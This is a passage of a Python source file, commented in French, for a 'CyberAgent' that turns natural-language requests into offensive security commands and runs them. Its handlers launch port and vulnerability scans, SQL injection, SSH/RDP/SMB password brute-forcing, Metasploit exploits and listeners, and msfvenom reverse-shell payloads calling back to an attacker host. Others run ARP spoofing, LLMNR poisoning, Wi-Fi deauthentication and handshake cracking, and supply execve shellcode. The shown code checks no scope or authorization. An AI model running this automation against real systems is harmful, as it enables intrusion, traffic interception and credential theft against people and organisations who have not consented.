            "offset finder", "find offset", "de bruijn",
        ])

    def _extract_direct_command(self, task: str) -> Optional[str]:
        """
        Si la tâche commence par un outil connu ET ressemble à une vraie commande
        shell (2ème token = flag '-' ou chemin '/' ou IP), la traite directement.
        Sinon, laisse les handlers catégorie interpréter le langage naturel.
        """
        parts = task.strip().split()
        if len(parts) < 2:
            return None
        tool = get_tool(parts[0].split("/")[-1])
        if not tool or tool.interactive:
            return None
        second = parts[1]
        # Reconnaître une vraie CLI : flag (-x), chemin (/tmp), IP (10.x), URL (http)
        is_cli = (
            second.startswith("-")
            or second.startswith("/")
            or second.startswith("http")
            or re.match(r"^\d{1,3}\.\d{1,3}", second)
        )
        return task.strip() if is_cli else None

    # ── Exécution générique ───────────────────────────────────────────────────

    def _run_command(self, command: str, original_task: str) -> dict:
        # Détecter le cwd depuis la tâche (ex: "dans /home/user/ctf")
        cwd = self._extract_cwd(original_task)
        result = terminal.run(command, cwd=cwd)

        if result.get("blocked"):
            return self._result(False, f"Bloqué : {result['error']}", {"command": command})

        if result["success"]:
            output = result["stdout"]
            if not output.strip():
                output = result.get("stderr", "") or "(aucune sortie)"
            return self._result(True, output, {"command": command, "returncode": result["returncode"]})

        err = result.get("stderr") or result.get("error", "Erreur inconnue")
        return self._result(False, f"Erreur (exit {result.get('returncode', -1)}):\n{err}",
                            {"command": command})

    def _extract_cwd(self, task: str) -> Optional[str]:
        m = re.search(r"(?:dans|in|cwd|répertoire|directory)\s+(/[\w/\-_.]+)", task)
        return m.group(1) if m else None

    # ── Handlers par catégorie ────────────────────────────────────────────────

    def _handle_recon(self, task: str) -> dict:
        t = task.lower()

        # Shodan — moteur de recherche d'appareils exposés
        if "shodan" in t:
            query = re.sub(r"\bshodan\b\s*", "", task, flags=re.IGNORECASE).strip()
            if query and not any(kw in query.lower() for kw in ["guide", "aide", "help", "scanner", "?"]):
                return self._run_command(f"shodan search '{query}'", task)
            return self._result(True,
                "🔍 Shodan — Moteur de recherche d'appareils exposés\n\n"
                "Commandes utiles :\n"
                "  shodan search 'apache country:FR'\n"
                "  shodan search 'default password'\n"
                "  shodan host <IP>           (infos sur une IP)\n"
                "  shodan count 'mongodb'\n"
                "  shodan stats --facets country,port 'nginx'\n\n"
                "Filtres puissants :\n"
                "  port:22 country:US org:'Amazon'\n"
                "  product:'IIS' version:'7.5'\n"
                "  vuln:CVE-2021-44228  (Log4Shell)\n\n"
                "Configuration : shodan init <API_KEY>",
                {"tool": "shodan"})

        target = self._extract_target(task)
        if not target:
            return self._result(False, "Spécifie une cible (IP, domaine ou plage réseau).",
                                {"hint": "Ex: scan 192.168.1.1 | nmap -sV 10.0.0.1"})

        # Choisir l'outil selon le contexte
        if any(kw in task.lower() for kw in ["dns", "sous-domaine", "subdomain"]):
            cmd = f"dnsrecon -d {target}"
        elif any(kw in task.lower() for kw in ["amass", "passif", "passive"]):
            cmd = f"amass enum -d {target}"
        elif any(kw in task.lower() for kw in ["arp", "local", "réseau local"]):
            cmd = f"arp-scan -l"
        elif any(kw in task.lower() for kw in ["rapide", "fast", "quick"]):
            cmd = f"rustscan -a {target} -- -sV --open"
        elif any(kw in task.lower() for kw in ["tous les ports", "all ports", "-p-"]):
            cmd = f"nmap -sV -sC -p- --open -T4 {target}"
        elif any(kw in task.lower() for kw in ["vuln", "vulnérabilité"]):
            cmd = f"nmap --script vuln -p 80,443,8080,445,22 {target}"
        elif any(kw in task.lower() for kw in ["udp"]):
            cmd = f"nmap -sU --top-ports 100 {target}"
        else:
            cmd = f"nmap -sV -sC --open -T4 {target}"

        return self._run_command(cmd, task)

    def _handle_web(self, task: str) -> dict:
        t = task.lower()

        # Burp Suite
        if any(kw in t for kw in ["burp", "burpsuite"]):
            return self._result(True,
                "Burp Suite — proxy d'interception web :\n"
                "  burpsuite          (lancement GUI)\n\n"
                "Pour des scans automatiques en CLI, utiliser OWASP ZAP :\n"
                "  zaproxy -cmd -quickurl http://<cible> -quickout /tmp/zap.html\n\n"
                "API REST Burp (si activée sur port 1337) :\n"
                "  curl -s 'http://localhost:1337/v0.1/scan' \\\n"
                "       -d '{\"urls\":[\"http://<cible>\"]}'",
                {"tool": "burpsuite"})

        # OWASP ZAP
        if any(kw in t for kw in ["zap", "zaproxy", "owasp"]):
            target = self._extract_url_or_target(task)
            if target:
                if not target.startswith("http"):
                    target = f"http://{target}"
                cmd = f"zaproxy -cmd -quickurl {target} -quickout /tmp/zap_report.html"
                return self._run_command(cmd, task)
            return self._result(False, "Spécifie une URL. Ex: zaproxy http://10.0.0.1")

        target = self._extract_url_or_target(task)
        if not target:
            return self._result(False, "Spécifie une URL cible.",
                                {"hint": "Ex: gobuster dir http://10.0.0.1 | nikto -h http://target"})

        if "sqlmap" in t:
            cmd = f"sqlmap -u '{target}' --dbs --batch"
        elif any(kw in t for kw in ["nikto", "vuln", "vulnérabilité"]):
            cmd = f"nikto -h {target}"
        elif any(kw in t for kw in ["ffuf", "fuzz", "param"]):
            wordlist = "/usr/share/seclists/Discovery/Web-Content/raft-large-files.txt"
            url = target if "FUZZ" in target else f"{target}/FUZZ"
            cmd = f"ffuf -w {wordlist} -u {url} -mc 200,301,302,403"
        elif any(kw in t for kw in ["wpscan", "wordpress", "wp"]):
            cmd = f"wpscan --url {target} --enumerate u,p,t"
        elif any(kw in t for kw in ["whatweb", "fingerprint", "technologie"]):
            cmd = f"whatweb -a 3 {target}"
        else:
            wordlist = "/usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt"
            cmd = f"gobuster dir -u {target} -w {wordlist} -t 50 -x php,html,txt,js"

        return self._run_command(cmd, task)

    # ── Wordlist par défaut (rockyou décompressé ou fallback) ─────────────────

    @staticmethod
    def _best_wordlist() -> str:
        for path in ["/tmp/rockyou.txt", "/usr/share/wordlists/rockyou.txt"]:
            if os.path.isfile(path):
                return path
        return "/usr/share/wordlists/fasttrack.txt"

    def _handle_passwords(self, task: str) -> dict:
        t = task.lower()
        target = self._extract_target(task)
        wordlist = self._best_wordlist()

        if any(kw in t for kw in ["hashcat", "john", "hash", "crack"]):
            hash_match = re.search(r"\b([a-fA-F0-9]{32,})\b", task)
            if hash_match:
                hash_val = hash_match.group(1)
                hash_file = f"/tmp/hash_{hash_val[:8]}.txt"
                with open(hash_file, "w") as f:
                    f.write(hash_val + "\n")
                length = len(hash_val)
                # John the Ripper (CPU — fonctionne sans GPU)
                fmt_map = {32: "raw-md5", 40: "raw-sha1", 64: "raw-sha256", 128: "raw-sha512"}
                fmt = fmt_map.get(length, "raw-md5")
                if "hashcat" in t:
                    # Informe que hashcat nécessite GPU, propose john
                    mode = {32: "0", 40: "100", 64: "1400", 128: "1700"}.get(length, "0")
                    return self._result(True,
                        f"Hash détecté : {hash_val} (longueur {length} → mode {mode})\n\n"
                        f"hashcat (requiert GPU) :\n"
                        f"  hashcat -m {mode} -a 0 {hash_file} {wordlist} --force\n\n"
                        f"john (CPU, lance maintenant) :\n"
                        f"  john {hash_file} --format={fmt} --wordlist={wordlist}\n\n"
                        f"Lancement john...",
                        {"hash": hash_val, "hash_file": hash_file})
                cmd = f"john {hash_file} --format={fmt} --wordlist={wordlist}"
            elif self._extract_file_path(task):
                file_path = self._extract_file_path(task)
                cmd = f"john {file_path} --wordlist={wordlist}"
            else:
                return self._result(False, "Fournis le hash à cracker.",
                                    {"hint": "Ex: crack 5f4dcc3b5aa765d61d8327deb882cf99 | john hash.txt"})
        elif any(kw in t for kw in ["john"]):
            file_path = self._extract_file_path(task)
            if not file_path:
                return self._result(False,
                    "john nécessite un fichier de hashes.\n"
                    f"Ex: john hash.txt --wordlist={wordlist}")
            cmd = f"john {file_path} --wordlist={wordlist}"
        elif any(kw in t for kw in ["crackmapexec", "cme"]):
            if not target:
                return self._result(False, "Spécifie une cible pour crackmapexec.")
            cmd = f"crackmapexec smb {target} -u users.txt -p passwords.txt"
        elif any(kw in t for kw in ["kerbrute", "kerberos"]):
            if not target:
                return self._result(False, "Spécifie le DC pour kerbrute.")
            cmd = f"kerbrute userenum --dc {target} -d domain.local /usr/share/seclists/Usernames/Names/names.txt"
        elif any(kw in t for kw in ["hydra"]):
            if not target:
                return self._result(False, "Spécifie une cible pour hydra.")
            if any(kw in t for kw in ["ftp"]):
                cmd = f"hydra -l admin -P {wordlist} ftp://{target}"
            elif any(kw in t for kw in ["http", "web", "login"]):
                cmd = f"hydra -l admin -P {wordlist} {target} http-get /"
            elif any(kw in t for kw in ["rdp"]):
                cmd = f"hydra -l administrator -P {wordlist} rdp://{target}"
            elif any(kw in t for kw in ["smb"]):
                cmd = f"hydra -l administrator -P {wordlist} smb://{target}"
            else:
                cmd = f"hydra -l root -P {wordlist} ssh://{target}"
        else:
            return self._result(False, "Précise l'outil (hydra/hashcat/john/crackmapexec/kerbrute) et la cible.")

        return self._run_command(cmd, task)

    def _handle_exploitation(self, task: str) -> dict:
        t = task.lower()
        target = self._extract_target(task)

        # Metasploit Framework — mode non-interactif
        if any(kw in t for kw in ["metasploit", "msfconsole", "msf"]) and "msfvenom" not in t:
            module_match = re.search(r"(exploit/[\w/]+|auxiliary/[\w/]+|post/[\w/]+)", task)
            lhost = self._extract_ip(task) or "10.10.10.10"
            lport = self._extract_port(task) or "4444"
            rhosts = target or "10.0.0.1"

            if module_match:
                module = module_match.group(1)
                msf_cmds = f"use {module}; set RHOSTS {rhosts}; set LHOST {lhost}; set LPORT {lport}; run; exit"
                cmd = f"msfconsole -q -x '{msf_cmds}'"
                return self._run_command(cmd, task)

            # Listener reverse shell
            if any(kw in t for kw in ["listener", "handler", "écoute", "reverse"]):
                payload = "windows/x64/meterpreter/reverse_tcp" if any(kw in t for kw in ["windows", "win"]) else "linux/x64/shell_reverse_tcp"
                msf_cmds = f"use exploit/multi/handler; set payload {payload}; set LHOST {lhost}; set LPORT {lport}; run; exit"
                cmd = f"msfconsole -q -x '{msf_cmds}'"
                return self._run_command(cmd, task)

            return self._result(True,
                "Metasploit Framework — utilisation non-interactive :\n\n"
                "  msfconsole -q -x 'use <MODULE>; set RHOSTS <IP>; set LHOST <IP>; run; exit'\n\n"
                "Modules courants :\n"
                "  exploit/multi/handler                      → Listener (reverse shell)\n"
                "  exploit/windows/smb/ms17_010_eternalblue   → EternalBlue (MS17-010)\n"
                "  exploit/unix/ftp/vsftpd_234_backdoor       → vsFTPd 2.3.4\n"
                "  exploit/multi/samba/usermap_script         → Samba usermap\n"
                "  auxiliary/scanner/smb/smb_version          → Scan version SMB\n"
                "  auxiliary/scanner/ssh/ssh_login            → Brute force SSH\n"
                "  auxiliary/scanner/portscan/tcp             → Scan de ports\n"
                "  post/multi/recon/local_exploit_suggester   → Suggérer privesc\n\n"
                "Précise le module ou l'action pour lancer directement.",
                {"tool": "msfconsole"})

        if "msfvenom" in t or "payload" in t:
            lhost = self._extract_ip(task) or "10.10.10.10"
            lport = self._extract_port(task) or "4444"
            if any(kw in t for kw in ["windows", "win", "exe"]):
                cmd = f"msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST={lhost} LPORT={lport} -f exe -o /tmp/shell.exe"
            elif any(kw in t for kw in ["php"]):
                cmd = f"msfvenom -p php/reverse_php LHOST={lhost} LPORT={lport} -f raw -o /tmp/shell.php"
            elif any(kw in t for kw in ["python", "py"]):
                cmd = f"msfvenom -p linux/x64/shell_reverse_tcp LHOST={lhost} LPORT={lport} -f py -b '\\x00'"
            elif any(kw in t for kw in ["aspx", "asp", "iis"]):
                cmd = f"msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST={lhost} LPORT={lport} -f aspx -o /tmp/shell.aspx"
            elif any(kw in t for kw in ["jar", "java"]):
                cmd = f"msfvenom -p java/shell_reverse_tcp LHOST={lhost} LPORT={lport} -f jar -o /tmp/shell.jar"
            else:
                cmd = f"msfvenom -p linux/x64/shell_reverse_tcp LHOST={lhost} LPORT={lport} -f elf -o /tmp/shell"
            return self._run_command(cmd, task)

        if "searchsploit" in t:
            term = re.sub(r"searchsploit\s*", "", task, flags=re.IGNORECASE).strip()
            if not term:
                return self._result(False, "Spécifie le terme de recherche. Ex: searchsploit apache 2.4")
            return self._run_command(f"searchsploit {term}", task)

        if any(kw in t for kw in ["impacket", "secretsdump"]):
            return self._result(False,
                "Pour impacket, fournis la commande complète.\n"
                "Ex: impacket-secretsdump domain/user:pass@target\n"
                "Ex: impacket-psexec domain/user:pass@target")

        return self._result(False, "Précise l'action d'exploitation (metasploit/msfvenom/searchsploit/impacket).")

    def _handle_reversing(self, task: str) -> dict:
        t = task.lower()
        binary = self._extract_file_path(task)

        if any(kw in t for kw in ["checksec", "protections", "mitigations", "pie", "nx", "canary"]):
            if not binary:
                return self._result(False, "Spécifie le binaire. Ex: checksec ./challenge")
            result = checksec(binary)
            return self._result(True, self._format_checksec(result), {"checksec": result})

        if any(kw in t for kw in ["rop", "gadget", "gadgets"]):
            if not binary:
                return self._result(False, "Spécifie le binaire. Ex: rop gadgets ./challenge | gadgets pop rdi ./binary")
            search_term = None
            m = re.search(r"(?:search|grep|cherch\w*)\s+['\"]?(.+?)['\"]?\s*$", t)
            if m:
                search_term = m.group(1)
            result = rop_gadgets(binary, search=search_term)
            if "error" in result:
                return self._result(False, result["error"])
            summary = f"Gadgets trouvés : {result['count']}\n"
            gadgets = result.get("gadgets", [])[:30]
            summary += "\n".join(f"  {g['address']} : {g['instruction']}" for g in gadgets)
            if result['count'] > 30:
                summary += f"\n... (+{result['count'] - 30} gadgets)"
            return self._result(True, summary, result)

        if any(kw in t for kw in ["objdump", "désassemble", "desassemble", "disassemble"]):
            if not binary:
                return self._result(False, "Spécifie le binaire.")
            cmd = f"objdump -d -M intel {binary}"
            return self._run_command(cmd, task)

        if any(kw in t for kw in ["strings"]):
            if not binary:
                return self._result(False, "Spécifie le fichier.")
            cmd = f"strings {binary}"
            return self._run_command(cmd, task)

        if any(kw in t for kw in ["readelf", "elf info", "sections", "symboles"]):
            if not binary:
                return self._result(False, "Spécifie le binaire.")
            if binary:
                info = elf_info(binary)
                return self._result(True, exploit_summary(binary), {"elf_info": info})

        if any(kw in t for kw in ["strace", "ltrace"]):
            if not binary:
                return self._result(False, "Spécifie le binaire.")
            tool = "strace" if "strace" in t else "ltrace"
            return self._run_command(f"{tool} {binary}", task)

        if any(kw in t for kw in ["analyse", "analyze", "analyse complète"]):
            if binary:
                return self._result(True, exploit_summary(binary))

        return self._result(False, "Précise l'action de reverse (checksec/gadgets/objdump/strings/strace/ltrace).")

    def _handle_network(self, task: str) -> dict:
        t = task.lower()
        target = self._extract_target(task)

        # Responder — lancement direct si interface précisée
        if any(kw in t for kw in ["responder"]):
            iface = re.search(r"\b(eth\d+|wlan\d+|tun\d+|ens\d+|eno\d+|lo)\b", task)
            if iface:
                mode = "-rdwv" if any(kw in t for kw in ["verbose", "-v"]) else "-rdw"
                cmd = f"responder -I {iface.group(0)} {mode}"
                return self._run_command(cmd, task)
            return self._result(True,
                "Responder — capture de hashes NTLMv2 (LLMNR/NBT-NS poisoning) :\n"
                "  responder -I eth0 -rdwv     (mode actif + verbose)\n"
                "  responder -I eth0 -A         (mode analyse uniquement, sans poison)\n\n"
                "Spécifie l'interface réseau pour lancer directement.\n"
                "Hashes capturés dans /usr/share/responder/logs/",
                {"tool": "responder"})

        # Bettercap — MITM framework
        if any(kw in t for kw in ["bettercap", "mitm", "arp spoofing", "arp-spoofing"]):
            iface = re.search(r"\b(eth\d+|wlan\d+|tun\d+|ens\d+|eno\d+)\b", task)
            if iface:
                if any(kw in t for kw in ["arp", "spoofing", "mitm", "sniff"]):
                    eval_cmds = "net.probe on; arp.spoof on; net.sniff on"
                    cmd = f"bettercap -iface {iface.group(0)} -eval '{eval_cmds}'"
                else:
                    cmd = f"bettercap -iface {iface.group(0)}"
                return self._run_command(cmd, task)
            return self._result(True,
                "Bettercap — framework MITM réseau :\n"
                "  bettercap -iface eth0\n"
                "  bettercap -iface eth0 -eval 'net.probe on; arp.spoof on; net.sniff on'\n"
                "  bettercap -iface eth0 -caplet arp-spoofing.cap\n\n"
                "Modules utiles en session interactive :\n"
                "  net.probe on          → découverte hôtes\n"
                "  arp.spoof on          → ARP poisoning\n"
                "  net.sniff on          → sniffer trafic\n"
                "  http.proxy on         → proxy HTTP\n"
                "  https.proxy on        → proxy HTTPS (SSLstrip)\n\n"
                "Spécifie l'interface réseau pour lancer directement.",
                {"tool": "bettercap"})

        # Wireshark / tshark
        if any(kw in t for kw in ["wireshark", "tshark"]):
            pcap = self._extract_file_path(task)
            iface = re.search(r"\b(eth\d+|wlan\d+|tun\d+|ens\d+)\b", task)
            if pcap and "tshark" in t:
                cmd = f"tshark -r {pcap}"
            elif iface and "tshark" in t:
                cmd = f"tshark -i {iface.group(0)} -c 100"
            elif pcap:
                cmd = f"tshark -r {pcap} -Y 'http or dns or ftp'"
            else:
                cmd = f"tshark -i {iface.group(0) if iface else 'eth0'} -c 50"
            return self._run_command(cmd, task)

        if any(kw in t for kw in ["tcpdump", "capture"]):
            iface = re.search(r"-i\s+(\w+)", task)
            iface = iface.group(1) if iface else "eth0"
            cmd = f"tcpdump -i {iface} -c 100"
            return self._run_command(cmd, task)

        if any(kw in t for kw in ["nc", "netcat", "écoute", "listen"]):
            port = self._extract_port(task) or "4444"
            cmd = f"nc -lvnp {port}"
            return self._run_command(cmd, task)

        return self._result(False, "Précise l'action réseau (tcpdump/responder/bettercap/wireshark/netcat/socat).")

    def _handle_forensics(self, task: str) -> dict:
        t = task.lower()
        file_path = self._extract_file_path(task)

        if any(kw in t for kw in ["volatility", "volatility3", "memory", "mémoire"]):
            if not file_path:
                return self._result(False, "Spécifie le dump mémoire. Ex: volatility3 -f memory.dmp windows.pslist")
            cmd = f"volatility3 -f {file_path} windows.info"
            return self._run_command(cmd, task)

        if any(kw in t for kw in ["exiftool", "metadata", "métadonnées"]):
            if not file_path:
                return self._result(False, "Spécifie le fichier.")
            return self._run_command(f"exiftool {file_path}", task)

        if any(kw in t for kw in ["binwalk", "firmware"]):
            if not file_path:
                return self._result(False, "Spécifie le firmware/fichier.")
            return self._run_command(f"binwalk {file_path}", task)

        return self._result(False, "Précise l'outil forensics (volatility3/exiftool/binwalk/foremost).")

    def _handle_wireless(self, task: str) -> dict:
        t = task.lower()
        bssid_match = re.search(r"\b([0-9a-fA-F]{2}(?::[0-9a-fA-F]{2}){5})\b", task)
        iface_match = re.search(r"\b(wlan\d+(?:mon)?|mon\d+)\b", task)
        iface = iface_match.group(0) if iface_match else "wlan0mon"

        # airmon-ng — gestion mode monitor
        if any(kw in t for kw in ["airmon", "monitor", "mode monitor", "monitor mode"]):
            raw_iface = re.search(r"\b(wlan\d+)\b", task)
            raw_iface = raw_iface.group(0) if raw_iface else "wlan0"
            if any(kw in t for kw in ["stop", "désactiver", "disable"]):
                cmd = f"airmon-ng stop {raw_iface}mon"
            elif any(kw in t for kw in ["check", "tuer", "kill"]):
                cmd = "airmon-ng check kill"
            else:
                cmd = f"airmon-ng start {raw_iface}"
            result = self._run_command(cmd, task)
            if not result.get("success"):
                out = result.get("output", "")
                if not out.strip():
                    result["output"] = (
                        f"[airmon-ng] Interface {raw_iface} introuvable ou permissions insuffisantes.\n\n"
                        "Interfaces disponibles : ip link show\n"
                        "Lancer en root : sudo airmon-ng start wlan0\n\n"
                        "Note : en VM, une clé Wi-Fi USB en passthrough est nécessaire."
                    )
            return result

        # airodump-ng — capture et découverte
        if any(kw in t for kw in ["airodump", "scanner wifi", "découvrir réseau", "capture wifi"]):
            if bssid_match:
                ch_match = re.search(r"(?:canal?|channel|-c)\s+(\d+)", t)
                ch = ch_match.group(1) if ch_match else "6"
                cmd = f"airodump-ng --bssid {bssid_match.group(0)} --channel {ch} --write /tmp/capture {iface}"
            else:
                cmd = f"airodump-ng {iface}"
            return self._run_command(cmd, task)

        # aireplay-ng — injection / deauth
        if any(kw in t for kw in ["aireplay", "deauth", "déauthentification", "injection"]):
            if not bssid_match:
                return self._result(False,
                    "Fournis le BSSID du point d'accès.\n"
                    "Ex: aireplay-ng deauth 10 AA:BB:CC:DD:EE:FF wlan0mon")
            count_match = re.search(r"\b(\d+)\b", t)
            count = count_match.group(1) if count_match and int(count_match.group(1)) < 1000 else "10"
            client_match = re.search(r"-c\s+([0-9a-fA-F:]{17})", task)
            if client_match:
                cmd = f"aireplay-ng --deauth {count} -a {bssid_match.group(0)} -c {client_match.group(1)} {iface}"
            else:
                cmd = f"aireplay-ng --deauth {count} -a {bssid_match.group(0)} {iface}"
            return self._run_command(cmd, task)

        # aircrack-ng — cracking handshake
        if any(kw in t for kw in ["aircrack", "crack wifi", "casser wpa", "cracker", "handshake"]):
            cap_file = self._extract_file_path(task) or "/tmp/capture-01.cap"
            wordlist_match = re.search(r"(?:wordlist|dict|dictionnaire)\s+(\S+)", t)
            wordlist = wordlist_match.group(1) if wordlist_match else "/usr/share/wordlists/rockyou.txt"
            if bssid_match:
                cmd = f"aircrack-ng -w {wordlist} -b {bssid_match.group(0)} {cap_file}"
            else:
                cmd = f"aircrack-ng -w {wordlist} {cap_file}"
            return self._run_command(cmd, task)

        # Guide complet workflow Wi-Fi
        return self._result(True,
            "Workflow complet attaque Wi-Fi WPA2 :\n\n"
            "1. Préparer l'interface :\n"
            "   airmon-ng check kill\n"
            "   airmon-ng start wlan0         → crée wlan0mon\n\n"
            "2. Scanner les réseaux :\n"
            "   airodump-ng wlan0mon\n\n"
            "3. Capturer le handshake :\n"
            "   airodump-ng --bssid <BSSID> --channel <CH> --write /tmp/capture wlan0mon\n\n"
            "4. Forcer le handshake (deauth) :\n"
            "   aireplay-ng --deauth 10 -a <BSSID> wlan0mon\n\n"
            "5. Cracker le handshake :\n"
            "   aircrack-ng -w /usr/share/wordlists/rockyou.txt /tmp/capture-01.cap\n\n"
            "Dis-moi quelle étape lancer et avec quel BSSID/interface.",
            {"tools": ["airmon-ng", "airodump-ng", "aireplay-ng", "aircrack-ng"]})

    def _handle_smb(self, task: str) -> dict:
        t = task.lower()
        target = self._extract_target(task)

        if any(kw in t for kw in ["enum4linux"]):
            if not target:
                return self._result(False, "Spécifie la cible.")
            return self._run_command(f"enum4linux -a {target}", task)

        if any(kw in t for kw in ["smbmap"]):
            if not target:
                return self._result(False, "Spécifie la cible.")
            return self._run_command(f"smbmap -H {target}", task)

        return self._result(False, "Précise l'outil SMB (enum4linux/smbmap/smbclient/crackmapexec).")

    # ── Exploit engine (sans shell) ───────────────────────────────────────────

    def _handle_exploit_engine(self, task: str) -> dict:
        t = task.lower()

        # Cyclic pattern
        if "cyclic" in t and "find" not in t:
            m = re.search(r"cyclic\s+(\d+)", t)
            length = int(m.group(1)) if m else 200
            pat = cyclic(length)
            return self._result(True,
                f"Pattern De Bruijn ({length} octets) :\n"
                f"Python  : {repr(pat)}\n"
                f"Hex     : {pat.hex()}\n"
                f"String  : {pat.decode('ascii', errors='replace')}",
                {"length": length, "pattern": pat.hex()})

        # Cyclic find / offset
        if any(kw in t for kw in ["cyclic_find", "find offset", "offset", "cyclic find"]):
            m = re.search(r"0x([0-9a-fA-F]+)", task)
            if not m:
                m2 = re.search(r"\b(\d{8,})\b", task)
                if m2:
                    val = int(m2.group(1))
                else:
                    return self._result(False, "Fournis la valeur crashée. Ex: find offset 0x61616161")
            else:
                val = int(m.group(1), 16)
            arch = "x64" if any(kw in t for kw in ["64", "x64", "rip"]) else "x86"
            result = find_offset(val, arch)
            return self._result(True,
                f"Valeur : {result['value']}\nOffset : {result['offset']}\n{result['note']}",
                result)

        # Checksec
        if "checksec" in t:
            binary = self._extract_file_path(task)
            if not binary:
                return self._result(False, "Spécifie le binaire. Ex: checksec ./challenge")
            result = checksec(binary)
            return self._result(True, self._format_checksec(result), {"checksec": result})

        # Shellcode template
        if "shellcode" in t:
            if "x64" in t or "64" in t:
                sc = get_shellcode("linux_x64_execve_sh")
            elif "x86" in t or "32" in t:
                sc = get_shellcode("linux_x86_execve_sh")
            else:
                sc = get_shellcode("linux_x64_execve_sh")
            if "error" in sc:
                return self._result(False, sc["error"])
            return self._result(True,
                f"Shellcode : {sc['description']}\n"
                f"Longueur  : {sc['length']} octets\n"
                f"Python    : sc = {sc['bytes_py']}\n"
                f"Hex       : {sc['hex_escaped']}",
                sc)

        # ROP gadgets via exploit engine
        if any(kw in t for kw in ["ropgadget", "rop gadget", "gadget"]):
            binary = self._extract_file_path(task)
            if not binary:
                return self._result(False, "Spécifie le binaire. Ex: ropgadget ./challenge pop rdi")
            search = None
            m = re.search(r"(?:grep|search|cherch\w+|pour)\s+['\"]?(.+?)['\"]?\s*$", t)
            if m:
                search = m.group(1)
            result = rop_gadgets(binary, search=search)
            if "error" in result:
                return self._result(False, result["error"])
            gadgets = result.get("gadgets", [])[:25]
            out = f"Gadgets ROP ({result['count']} trouvés) :\n"
            out += "\n".join(f"  {g['address']} : {g['instruction']}" for g in gadgets)
            return self._result(True, out, result)

        return self._result(False, "Exploit engine : cyclic <N> | find offset <val> | checksec <bin> | shellcode x64 | ropgadget <bin>")

    # ── Helpers d'extraction ──────────────────────────────────────────────────

    def _extract_target(self, task: str) -> Optional[str]:
        # IP
        m = re.search(r"\b(\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}(?:/\d+)?)\b", task)
        if m:
            return m.group(1)
        # CIDR range
        m = re.search(r"\b(\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}/\d+)\b", task)
        if m:
            return m.group(1)
        # Hostname/domaine
        m = re.search(r"\b((?:[a-zA-Z0-9\-]+\.)+[a-zA-Z]{2,})\b", task)
        if m and m.group(1) not in ("et", "de", "du", "un", "le", "la"):
            return m.group(1)
        return None

    def _extract_url_or_target(self, task: str) -> Optional[str]:
        m = re.search(r"(https?://\S+)", task)
        if m:
            return m.group(1).rstrip("/,.")
        return self._extract_target(task)

    def _extract_file_path(self, task: str) -> Optional[str]:
        m = re.search(r"([./][\w/\-_.]+(?:\.(?:elf|exe|bin|out|so|dll|py|txt|dmp))?)", task)
        if m:
            return m.group(1)
        # Juste un nom de fichier sans chemin
        m2 = re.search(r"\b(\w[\w\-_.]+\.(?:elf|exe|bin|out|so|dll|dmp))\b", task)
        if m2:
            return m2.group(1)
        return None

    def _extract_ip(self, task: str) -> Optional[str]:
        m = re.search(r"\b(\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3})\b", task)
        return m.group(1) if m else None

    def _extract_port(self, task: str) -> Optional[str]:
        m = re.search(r"\b(port\s+|:)(\d{2,5})\b", task, re.IGNORECASE)
        if m:
            return m.group(2)
        m2 = re.search(r"\b(\d{4,5})\b", task)
        return m2.group(1) if m2 else None

    def _format_checksec(self, result: dict) -> str:
        if "error" in result:
            return f"Erreur checksec : {result['error']}"
        lines = [f"Protections de {result.get('binary', 'binaire')} :"]
        icons = {
            "Full RELRO": "✓", "Partial RELRO": "~", "No RELRO": "✗",
            "NX enabled": "✓", "NX disabled": "✗",
            "PIE enabled": "✓", "No PIE": "✗", "PIE disabled": "✗",
            "Canary found": "✓", "No canary": "✗",
        }
        for key in ["NX", "PIE", "Stack", "RELRO", "RUNPATH"]:
            val = result.get(key, "unknown")
            icon = icons.get(val, "?")
            lines.append(f"  {icon} {key:8} : {val}")
        return "\n".join(lines)


cyber_agent = CyberAgent()
